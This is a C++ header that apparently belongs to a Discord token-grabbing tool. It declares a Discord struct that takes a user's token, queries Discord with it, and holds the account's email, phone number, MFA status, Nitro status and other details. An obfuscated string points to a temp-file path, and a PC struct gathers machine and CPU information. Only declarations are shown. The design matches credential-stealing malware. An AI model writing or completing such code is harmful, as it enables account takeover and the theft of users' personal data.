#pragma once
#include <Windows.h>
#include <fstream>
#include <filesystem>
#include <cpr/cpr.h>
#include <json/value.h>
#include <json/json.h>
#include "AY_Obfuscate.h"

namespace User
{
	inline bool logged = false;

	inline namespace local {
		void toLowerCase(char* ptr, size_t size);
	}

	struct Discord {
	private:
		cpr::Response Get_Request(const std::string& token);
		const char* info_path = AY_OBFUSCATE("C:\\Windows\\Temp\\info.json"); // Don't remove, but change the path if you'd like (has to stay as JSON file)
	public:
		//Discord() = default;
		Discord(const std::string& token);
		std::string get_token_info();
		~Discord() = default;
	private:
		std::string token;
		std::string username = "none";
		std::string id = "none";
		std::string avatar = "none";
		std::string email = "none";
		std::string phone = "none";
		std::string locale = "none";
		bool verified{};
		bool mfa_enabled{};
		std::string banner = "none";
		int nitro{};
	};

	struct PC {
	private:
		std::string get_CPU(); // Reference: https://weseetips.wordpress.com/tag/c-get-cpu-name/
	public:
		PC() = default;
		std::string get_info();
		~PC() = default;
	};
};